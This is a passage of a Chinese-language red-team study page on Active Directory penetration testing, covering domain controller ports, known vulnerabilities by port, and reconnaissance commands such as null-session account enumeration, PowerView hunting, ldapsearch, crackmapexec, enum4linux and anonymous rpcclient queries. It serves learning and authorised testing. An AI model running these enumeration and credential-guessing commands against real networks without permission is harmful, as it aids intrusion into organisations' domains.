<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Cyber-Security/Red_Team/AD_Pentest" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">AD 網域滲透測試 | Welcome to Jonathan&#x27;s site！</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://jonafk555.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://jonafk555.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/AD_Pentest"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="AD 網域滲透測試 | Welcome to Jonathan&#x27;s site！"><meta data-rh="true" name="description" content="學習連結"><meta data-rh="true" property="og:description" content="學習連結"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/AD_Pentest"><link data-rh="true" rel="alternate" href="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/AD_Pentest" hreflang="en"><link data-rh="true" rel="alternate" href="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/AD_Pentest" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.e5a10a03.css">
<script src="/assets/js/runtime~main.c84f042a.js" defer="defer"></script>
<script src="/assets/js/main.234aa50a.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Entry Point</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/category/cyber-security-資訊安全">Notes</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/jonafk555" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/cyber-security-資訊安全">Cyber Security 資訊安全</a><button aria-label="Collapse sidebar category &#x27;Cyber Security 資訊安全&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/red-team-紅隊安全">Red Team 紅隊安全</a><button aria-label="Collapse sidebar category &#x27;Red Team 紅隊安全&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Cyber-Security/Red_Team/AD_Pentest">紅隊安全 | AD 網域滲透測試</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/Linux_Post_Exploitation">紅隊安全 | Linux 後滲透</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/Powershell">紅隊安全 | 不開啟 Powershell 執行 powershell.exe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation">紅隊安全 | Windows 後滲透</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/lolbas">紅隊安全 | LOLBAS 下載工具</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/pivoting">紅隊安全 | 端口轉發與跳板</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/forensic-medicine-法醫學">Forensic Medicine 法醫學</a><button aria-label="Expand sidebar category &#x27;Forensic Medicine 法醫學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/forensic-science-鑑識科學">Forensic Science 鑑識科學</a><button aria-label="Expand sidebar category &#x27;Forensic Science 鑑識科學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/criminology-犯罪學">Criminology 犯罪學</a><button aria-label="Expand sidebar category &#x27;Criminology 犯罪學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/biochemistry-生物化學">Biochemistry 生物化學</a><button aria-label="Expand sidebar category &#x27;Biochemistry 生物化學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">intro</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/cyber-security-資訊安全"><span itemprop="name">Cyber Security 資訊安全</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/red-team-紅隊安全"><span itemprop="name">Red Team 紅隊安全</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">紅隊安全 | AD 網域滲透測試</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>AD 網域滲透測試</h1></header>
<p>學習連結</p>
<ul>
<li><a href="https://www.ired.team/offensive-security/lateral-movement" target="_blank" rel="noopener noreferrer">橫向移動</a></li>
<li><a href="https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67" target="_blank" rel="noopener noreferrer">[內網滲透]Pass the Hash(PtH)攻擊手法及防禦、偵測措施</a></li>
<li><a href="https://tech-blog.cymetrics.io/posts/zet/purple-man-my-superman/" target="_blank" rel="noopener noreferrer">遊走紅隊與藍隊：Purple man 我的超人</a></li>
<li>Active Directory<!-- -->
<ul>
<li><a href="https://github.com/geeksniper/active-directory-pentest" target="_blank" rel="noopener noreferrer">https://github.com/geeksniper/active-directory-pentest</a></li>
<li><a href="https://zer1t0.gitlab.io/posts/attacking_ad/" target="_blank" rel="noopener noreferrer">https://zer1t0.gitlab.io/posts/attacking_ad/</a></li>
<li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory" target="_blank" rel="noopener noreferrer">https://hideandsec.sh/books/cheatsheets-82c/page/active-directory</a></li>
</ul>
</li>
<li>NXC：<!-- -->
<ul>
<li><a href="https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/netexec" target="_blank" rel="noopener noreferrer">https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/netexec</a></li>
<li><a href="https://www.netexec.wiki/" target="_blank" rel="noopener noreferrer">https://www.netexec.wiki/</a></li>
<li><a href="https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/</a>
:::</li>
</ul>
</li>
</ul>
<h1>AD 基礎知識</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="microsoft-ad-訓練課程">Microsoft AD 訓練課程<a href="#microsoft-ad-訓練課程" class="hash-link" aria-label="Direct link to Microsoft AD 訓練課程" title="Direct link to Microsoft AD 訓練課程">​</a></h2>
<ul>
<li><a href="https://learn.microsoft.com/zh-tw/training/browse/?roles=security-engineer%2Csecurity-operations-analyst&amp;expanded=security&amp;subjects=security" target="_blank" rel="noopener noreferrer">系統資訊安全</a></li>
<li><a href="https://learn.microsoft.com/zh-tw/training/paths/active-directory-domain-services/?source=recommendations" target="_blank" rel="noopener noreferrer">AD</a></li>
</ul>
<h1>DC</h1>
<ul>
<li>DC (Domain Controller)</li>
<li>RODC (Read-Only Domain Controller)</li>
<li>加入 AD<!-- -->
<ul>
<li>DNS 指向 AD</li>
<li>將系統加入 AD</li>
<li>使用網域帳號登入</li>
</ul>
</li>
<li>DC 與 DNS 通常是同一台</li>
<li>DC common port list：</li>
</ul>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">- Port 389 LDAP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Port 636 LDAP over SSL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Port 88 Kerberos Authentication</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Port 3268 Global catalog Search</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Port 3269 Global catalog LDAP over SSL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dc-的功能">DC 的功能：<a href="#dc-的功能" class="hash-link" aria-label="Direct link to DC 的功能：" title="Direct link to DC 的功能：">​</a></h2>
<ul>
<li>身份驗證: Kerberos、NTLM...</li>
<li>授權: 訪問控制、群組原則的應用。</li>
<li>帳戶管理: 使用者、電腦、群組的建立、修改和刪除。</li>
<li>時間同步: 網域內的時間同步服務。</li>
<li>憑證服務 (AD CS)</li>
</ul>
<p>DC 的安全考量：</p>
<ul>
<li>實體安全: 保護 DC 的實體存取。</li>
<li>作業系統安全: 定期更新、安全配置。</li>
<li>最小化安裝: 僅安裝必要的服務。</li>
<li>監控與日誌: 監控 DC 的安全事件。</li>
</ul>
<h1>Recon</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="nmap">Nmap<a href="#nmap" class="hash-link" aria-label="Direct link to Nmap" title="Direct link to Nmap">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="常見開放-port-與其對應漏洞">常見開放 Port 與其對應漏洞<a href="#常見開放-port-與其對應漏洞" class="hash-link" aria-label="Direct link to 常見開放 Port 與其對應漏洞" title="Direct link to 常見開放 Port 與其對應漏洞">​</a></h3>
<ul>
<li>53/tcp/udp (domain): DNS 服務，可能存在 DNS Zone Transfer 漏洞。</li>
<li>123/udp (ntp): NTP 服務，可能用於時間同步攻擊。</li>
<li>135/tcp (msrpc)：<!-- -->
<ul>
<li>提供微軟的遠端過程呼叫（Microsoft RPC）服務。</li>
<li>可能被用於遠端程式碼執行漏洞利用（如 MS08-067）。</li>
<li>MS03-026 (Blaster/Lovsan 蠕蟲):</li>
<li>漏洞: DCOM RPC 介面中的緩衝區溢位漏洞 (CVE-2003-0352)。</li>
<li>MS08-067 (Conficker 蠕蟲):</li>
<li>PrintNightmare (CVE-2021-1675, CVE-2021-34527):<!-- -->
<ul>
<li>漏洞: Windows 列印多工緩衝處理器服務 (Print Spooler) 中的多個漏洞，涉及其 RPC 介面。</li>
<li>影響: 允許經過身份驗證的低權限使用者（甚至在某些情況下是未經身份驗證的攻擊者）透過 RPC 呼叫（例如 RpcAddPrinterDriverEx()) 遠端執行程式碼（SYSTEM 權限）或進行本地權限提升。儘管攻擊可能透過 SMB (445) 或直接 RPC 進行，但核心問題在於 Spooler 服務的 RPC 處理邏輯。</li>
</ul>
</li>
<li>DCOM 強制執行變更相關 (例如 CVE-2021-26414)</li>
</ul>
</li>
<li>137/udp (netbios-ns): NetBIOS Name Service，可能洩漏主機名稱資訊。</li>
<li>138/udp (netbios-dgm): NetBIOS Datagram Service。</li>
<li>139/tcp (netbios-ssn) &amp; 445/tcp (microsoft-ds)：<!-- -->
<ul>
<li>提供 SMB 服務，可能用於檔案共用和身份驗證。是非常重要的目標，可以嘗試憑證攻擊、漏洞或共享檔案枚舉。</li>
<li><code>SMBv2 Message signing enabled but not required</code> --&gt; ntlmrelay</li>
</ul>
</li>
<li>593/tcp (ncacn_ip_tcp): MSRPC Endpoint Mapper Port，與 135 類似。</li>
<li>3389/tcp (ms-wbt-server)：<!-- -->
<ul>
<li>遠端桌面協定 (RDP) 服務。</li>
<li>可以嘗試暴力破解或漏洞（如 <a href="https://github.com/Ekultek/BlueKeep" target="_blank" rel="noopener noreferrer">BlueKeep</a>）。</li>
</ul>
</li>
<li>49152+ /tcp (Dynamic RPC ports): 動態 RPC Port 範圍，與 MSRPC 相關。</li>
<li>5985/tcp &amp; 5986/tcp (wsman): WinRM (PowerShell Remoting) 服務。</li>
<li>9389/tcp (adws): Active Directory Web Services。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nmap-scripting-engine-nse">Nmap Scripting Engine (NSE)：<a href="#nmap-scripting-engine-nse" class="hash-link" aria-label="Direct link to Nmap Scripting Engine (NSE)：" title="Direct link to Nmap Scripting Engine (NSE)：">​</a></h3>
<ul>
<li>smb-vuln-* 腳本系列 (EternalBlue, WannaCry 等漏洞檢測)</li>
<li>smb-enum-shares 腳本 (枚舉 SMB 共享)</li>
<li>smb-os-discovery 腳本 (偵測作業系統版本)</li>
<li>ldap-* 腳本系列 (LDAP 相關的偵查)</li>
<li>winrm-* 腳本系列 (WinRM 相關的偵查)</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-環境下的枚舉">Windows 環境下的枚舉<a href="#windows-環境下的枚舉" class="hash-link" aria-label="Direct link to Windows 環境下的枚舉" title="Direct link to Windows 環境下的枚舉">​</a></h2>
<ul>
<li>查詢 Local User<!-- -->
<ul>
<li><code>net user</code></li>
<li><code>net user &lt;username&gt;</code></li>
</ul>
</li>
<li>查詢 password policy<!-- -->
<ul>
<li><code>net accounts</code>
<img decoding="async" loading="lazy" src="https://hackmd.io/_uploads/BJQR6SNqke.png" alt="image" class="img_ev3q"></li>
</ul>
</li>
<li>查詢 Domain User<!-- -->
<ul>
<li><code>net user /domain</code></li>
<li><code>net user {username} /domain</code></li>
</ul>
</li>
<li>查詢權限<!-- -->
<ul>
<li><code>whoami /priv</code></li>
</ul>
</li>
<li>查詢預設高權限群組<!-- -->
<ul>
<li><code>net groups /domain</code></li>
<li><code>net groups &quot;Domain Admins&quot; /domain</code></li>
<li><code>net groups &quot;Schema Admins&quot; /domain</code></li>
<li><code>net groups &quot;Enterprise Admins&quot; /domain</code></li>
</ul>
</li>
<li>利用 null session 做帳號枚舉/身分驗證錯誤<!-- -->
<ul>
<li>建立 null session：<code>net use \\DC01\ipc$ &quot;&quot; /u:&quot;&quot;</code></li>
<li><code>net use \\DC01\ipc$ &quot;&quot; /u:guest</code>
<ul>
<li>可能出現：<code>This user can&#x27;t sign in because this account is currently disabled.</code></li>
</ul>
</li>
<li>帶有 password 時：<code>net use \\DC01\ipc$ &quot;password&quot; /u:guest</code>
<ul>
<li>可能出現：<code>The user name or password is incorrect.</code></li>
<li>或是：<code>The referenced account is currently locked out and may not be logged on to.</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-cmdlet">PowerShell Cmdlet：<a href="#powershell-cmdlet" class="hash-link" aria-label="Direct link to PowerShell Cmdlet：" title="Direct link to PowerShell Cmdlet：">​</a></h3>
<ul>
<li><code>Get-ADGroup</code>：查詢網域群組資訊。</li>
<li><code>Get-ADComputer</code>：查詢網域電腦資訊。</li>
<li><code>Get-ADObject</code>：查詢 AD 物件資訊。</li>
<li><code>Get-NetDomain</code>：查詢網域資訊。</li>
<li><code>Get-NetForest</code>：查詢樹系資訊。</li>
<li><code>Get-NetOU</code>：查詢組織單位 (OU) 資訊。</li>
<li><code>Get-NetGPO</code>：查詢群組原則物件 (GPO) 資訊。</li>
<li><code>Get-NetLocalGroupMember</code>：查詢本機群組成員。</li>
<li><code>Get-NetGroupMember</code>：查詢網域群組成員。</li>
<li><code>Get-MpComputerStatus</code>：觀察防毒狀態</li>
<li><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code>：AppLockerl</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap-">LDAP ：<a href="#ldap-" class="hash-link" aria-label="Direct link to LDAP ：" title="Direct link to LDAP ：">​</a></h3>
<ul>
<li>DN<!-- -->:Distinguish<!-- --> Name</li>
<li>CN: Common Name</li>
<li>OU<!-- -->:Organization<!-- --> Unit Name</li>
<li>DC: Domain Componet</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="linux-ldap-recon">Linux LDAP Recon：<a href="#linux-ldap-recon" class="hash-link" aria-label="Direct link to Linux LDAP Recon：" title="Direct link to Linux LDAP Recon：">​</a></h4>
<ul>
<li>tools：<a href="https://github.com/ropnop/windapsearch" target="_blank" rel="noopener noreferrer">windapsearch.py</a>, ldapsearch, <a href="https://github.com/dirkjanm/ldapdomaindump" target="_blank" rel="noopener noreferrer">ldapdomaindump.py</a></li>
<li>沒有 password，有帳號時：<!-- -->
<ul>
<li><code>ldapsearch -H ldap://&lt;ip&gt; -x -b &quot;DC=...,DC=...&quot; -s sub &quot;*&quot;</code></li>
<li>搜尋 password policy：<code>ldapsearch -H ldap://&lt;ip&gt; -x -b &quot;DC=...,DC=...&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength</code></li>
<li>獲取 Domain user lists：<code>ldapsearch -H ldap://&lt;ip&gt; -x -b &quot;DC=...,DC=...&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></li>
</ul>
</li>
<li>有password：<code>ldapsearch -x -H ldap://&lt;ip&gt; -D &#x27;user@domain&#x27; -w &#x27;password&#x27; -b &#x27;dc=&lt;domain_name&gt;,dc=&lt;top_domain&gt;&#x27; &#x27;(ObjectClass=user)&#x27;</code>
<ul>
<li><code>nxc ldap -u &lt;user&gt; -p &lt;password&gt;</code> --&gt; NTLM 驗證(NXC 默認驗證方法)，要啟用 Protocol transition 才能用 NTLM 存取 kerberos 驗證的服務。</li>
<li><code>nxc ldap -u &lt;user&gt; -p &lt;password&gt; -k</code> --&gt; 指定用 Kerberos 驗證(Protocol transition 關閉時可以用)</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="domain-controller">Domain Controller<a href="#domain-controller" class="hash-link" aria-label="Direct link to Domain Controller" title="Direct link to Domain Controller">​</a></h3>
<ul>
<li><code>echo %logonserver%</code></li>
<li><code>nltest /dclist:&lt;domain&gt;</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="powerview">Powerview<a href="#powerview" class="hash-link" aria-label="Direct link to Powerview" title="Direct link to Powerview">​</a></h3>
<ul>
<li>用之前先 import：<code>import-module .\PowerView.ps1</code>
<ul>
<li>Password Policy：<code>Get-DomainPolicy</code></li>
<li><code>Invoke-UserHunter</code>：PowerView 中的腳本，用於尋找網域管理員登入的系統。</li>
<li><code>Invoke-ProcessHunter</code>：PowerView 中的腳本，用於尋找特定進程 (例如 Mimikatz) 運行的系統。</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="smb">SMB<a href="#smb" class="hash-link" aria-label="Direct link to SMB" title="Direct link to SMB">​</a></h3>
<ul>
<li>ExternalBlue, WannaCry</li>
<li>port：139 (NetBIOS), 445</li>
<li>smbclient<!-- -->
<ul>
<li><code>smbclient -L \\&lt;ip&gt; -U user%password</code></li>
<li><code>smbclient -U user \\\\10.129.42.197\\SHARENAME</code></li>
</ul>
</li>
<li>smbmap<!-- -->
<ul>
<li><code>smbmap -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt; -H &lt;host_ip&gt;</code></li>
</ul>
</li>
<li>Crackmapexec / <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">nxc</a></li>
<li><a href="https://github.com/seriotonctf/cme-nxc-cheat-sheet" target="_blank" rel="noopener noreferrer">https://github.com/seriotonctf/cme-nxc-cheat-sheet</a>
<ul>
<li>獲取 Domain user lists：<code>crackmapexec smb &lt;host_ip&gt; --users</code></li>
<li><code>crackmapexec smb &lt;host_ip&gt; -u &lt;username&gt; -p &lt;password&gt;</code></li>
<li><code>crackmapexec smb &lt;host_ip&gt; -u &quot;user&quot; -p &quot;password&quot; --shares</code></li>
</ul>
</li>
<li>enum4linux<!-- -->
<ul>
<li><code>enum4linux -P &lt;Host_IP&gt;</code></li>
<li>獲取 Domain user lists：<code>enum4linux -U &lt;Host_IP&gt;  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</code></li>
<li><code>enum4linux -u &lt;username&gt; -p &lt;password&gt; &lt;Host_IP&gt;</code></li>
</ul>
</li>
<li>enum4linux-ng<!-- -->
<ul>
<li><code>enum4linux-ng -P {ip} -oA {output_filename}</code></li>
</ul>
</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="rpc-port-135">RPC (Port 135)<a href="#rpc-port-135" class="hash-link" aria-label="Direct link to RPC (Port 135)" title="Direct link to RPC (Port 135)">​</a></h4>
<p><code>rpcclient</code> <strong>Samba</strong> 套件的一部分，可以用來連接目標主機並執行各種 RPC 操作，像是枚舉使用者、群組、共享資料夾等資訊。</p>
<ul>
<li>匿名登入：<code>rpcclient -U &quot;&quot; -N &lt;ip&gt;</code>
<ul>
<li><code>-U &quot;&quot;</code>：表示匿名連接，無需提供使用者名稱。</li>
<li><code>-N</code>：表示不要求密碼。</li>
<li>取得 Password policy：<code>querydominfo</code></li>
<li>利用 ldap 匿名取得 Domain user lists：<code>enumdomusers</code>
<ul>
